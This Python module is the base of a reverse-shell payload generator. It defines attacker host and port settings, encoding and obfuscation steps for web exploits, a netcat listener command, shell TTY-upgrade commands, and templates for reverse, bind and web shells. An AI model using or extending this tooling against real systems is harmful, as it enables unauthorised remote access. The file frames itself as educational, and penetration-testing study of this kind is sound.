"""
Base Payload Generator
Provides the foundation for all payload generators
"""

from abc import ABC, abstractmethod
from typing import Dict, Optional, List
from dataclasses import dataclass
import base64
import urllib.parse


@dataclass
class PayloadConfig:
    """Configuration for payload generation"""
    lhost: str              # Listening host (attacker IP)
    lport: int              # Listening port
    shell_type: str = "/bin/bash"  # Shell to spawn
    encode: bool = False    # Base64 encode
    obfuscate: bool = False # Obfuscate the payload
    url_encode: bool = False # URL encode for web exploits
    timeout: int = 0        # Timeout (0 = infinite)
    
    def __post_init__(self):
        """Validate configuration"""
        if not self.lhost:
            raise ValueError("LHOST cannot be empty")
        if not isinstance(self.lport, int) or not (1 <= self.lport <= 65535):
            raise ValueError(f"Invalid port: {self.lport}")


class PayloadGenerator(ABC):
    """
    Base class for all payload generators
    
    Each payload generator inherits from this and implements:
    - generate(): Create the actual payload
    - explain(): Provide educational explanation
    - test_requirements(): Check if target has required tools
    """
    
    def __init__(self, config: PayloadConfig):
        self.config = config
        self.name = self.__class__.__name__.replace('Generator', '')
    
    @abstractmethod
    def generate(self) -> str:
        """
        Generate the reverse shell payload
        
        Returns:
            str: The complete payload ready to execute
        """
        pass
    
    @abstractmethod
    def explain(self) -> Dict[str, str]:
        """
        Provide educational explanation of the payload
        
        Returns:
            Dict with keys: 'overview', 'how_it_works', 'requirements', 'usage'
        """
        pass
    
    @abstractmethod
    def test_requirements(self) -> List[str]:
        """
        List of tools/interpreters required on target
        
        Returns:
            List of required tools (e.g., ['python3', 'bash'])
        """
        pass
    
    def encode_base64(self, payload: str) -> str:
        """Encode payload in base64"""
        encoded = base64.b64encode(payload.encode()).decode()
        return encoded
    
    def url_encode(self, payload: str) -> str:
        """URL encode the payload for web exploits"""
        return urllib.parse.quote(payload)
    
    def obfuscate_simple(self, payload: str) -> str:
        """
        Simple obfuscation (string concatenation)
        Override in specific generators for better obfuscation
        """
        # Split payload into chunks and concatenate
        # This is language-specific, so default just returns original
        return payload
    
    def post_process(self, payload: str) -> str:
        """
        Apply post-processing based on config
        
        Args:
            payload: Raw payload string
            
        Returns:
            Processed payload
        """
        result = payload
        
        # Apply obfuscation first (before encoding)
        if self.config.obfuscate:
            result = self.obfuscate_simple(result)
        
        # Then encode if needed
        if self.config.encode:
            result = self.encode_base64(result)
        
        # URL encode last (for web exploits)
        if self.config.url_encode:
            result = self.url_encode(result)
        
        return result
    
    def get_one_liner(self) -> str:
        """
        Get the payload as a single line (useful for command injection)
        
        Returns:
            Single-line payload
        """
        payload = self.generate()
        # Remove newlines and extra spaces
        return ' '.join(payload.split())
    
    def get_listener_command(self) -> str:
        """
        Get the command to start the listener
        
        Returns:
            Command to start listener (usually netcat)
        """
        return f"nc -lvnp {self.config.lport}"
    
    def get_upgrade_commands(self) -> List[str]:
        """
        Get commands to upgrade the shell to full TTY
        
        Returns:
            List of commands for TTY upgrade
        """
        return [
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "# Press Ctrl+Z",
            "stty raw -echo; fg",
            "export TERM=xterm",
            "stty rows 38 columns 116"
        ]


class PayloadExplanation:
    """
    Helper class for creating beautiful payload explanations
    """
    
    @staticmethod
    def format_explanation(
        overview: str,
        how_it_works: str,
        requirements: List[str],
        usage: str,
        tips: Optional[str] = None
    ) -> Dict[str, str]:
        """
        Format a complete explanation
        
        Args:
            overview: What this payload does
            how_it_works: Step-by-step breakdown
            requirements: What's needed on target
            usage: How to use it
            tips: Optional tips and tricks
            
        Returns:
            Formatted explanation dictionary
        """
        explanation = {
            'overview': overview,
            'how_it_works': how_it_works,
            'requirements': '\n'.join(f"• {req}" for req in requirements),
            'usage': usage
        }
        
        if tips:
            explanation['tips'] = tips
        
        return explanation


class PayloadValidator:
    """
    Validates payloads before delivery
    """
    
    @staticmethod
    def validate_ip(ip: str) -> bool:
        """Validate IP address format"""
        import re
        pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
        if not re.match(pattern, ip):
            return False
        
        # Check each octet
        octets = ip.split('.')
        return all(0 <= int(octet) <= 255 for octet in octets)
    
    @staticmethod
    def validate_port(port: int) -> bool:
        """Validate port number"""
        return isinstance(port, int) and 1 <= port <= 65535
    
    @staticmethod
    def check_dangerous_chars(payload: str, context: str = 'shell') -> List[str]:
        """
        Check for characters that might break in certain contexts
        
        Args:
            payload: The payload to check
            context: Where it will be used ('shell', 'url', 'sql', etc.)
            
        Returns:
            List of warnings about dangerous characters
        """
        warnings = []
        
        if context == 'url':
            dangerous = ['&', '|', ';', '<', '>', '(', ')', '{', '}', '$']
            found = [c for c in dangerous if c in payload]
            if found:
                warnings.append(f"Found characters that need URL encoding: {', '.join(found)}")
        
        elif context == 'shell':
            if '"' in payload and "'" in payload:
                warnings.append("Payload contains both single and double quotes - may need escaping")
        
        return warnings


# Common payload templates
PAYLOAD_TEMPLATES = {
    'reverse_shell': {
        'description': 'Standard reverse shell that connects back to attacker',
        'use_case': 'When you have command execution and want full shell access'
    },
    'bind_shell': {
        'description': 'Opens a port on target for attacker to connect to',
        'use_case': 'When target can\'t make outbound connections but you can reach it'
    },
    'web_shell': {
        'description': 'Web-based shell accessed via HTTP',
        'use_case': 'When you have file upload but can\'t get reverse connection'
    }
}


def create_generator(payload_type: str, config: PayloadConfig) -> PayloadGenerator:
    """
    Factory function to create appropriate payload generator
    
    Args:
        payload_type: Type of payload (bash, python3, php, etc.)
        config: PayloadConfig instance
        
    Returns:
        Appropriate PayloadGenerator instance
        
    Raises:
        ValueError: If payload_type is not supported
    """
    # Import generators here to avoid circular imports
    from generators.bash import BashGenerator
    from generators.python import Python3Generator, Python2Generator
    from generators.php import PHPGenerator
    from generators.powershell import PowerShellGenerator
    from generators.perl import PerlGenerator
    
    generators = {
        'bash': BashGenerator,
        'python3': Python3Generator,
        'python': Python3Generator,  # Default to python3
        'python2': Python2Generator,
        'php': PHPGenerator,
        'powershell': PowerShellGenerator,
        'perl': PerlGenerator,
    }
    
    generator_class = generators.get(payload_type.lower())
    if not generator_class:
        raise ValueError(
            f"Unknown payload type: {payload_type}. "
            f"Available: {', '.join(generators.keys())}"
        )
    
    return generator_class(config)
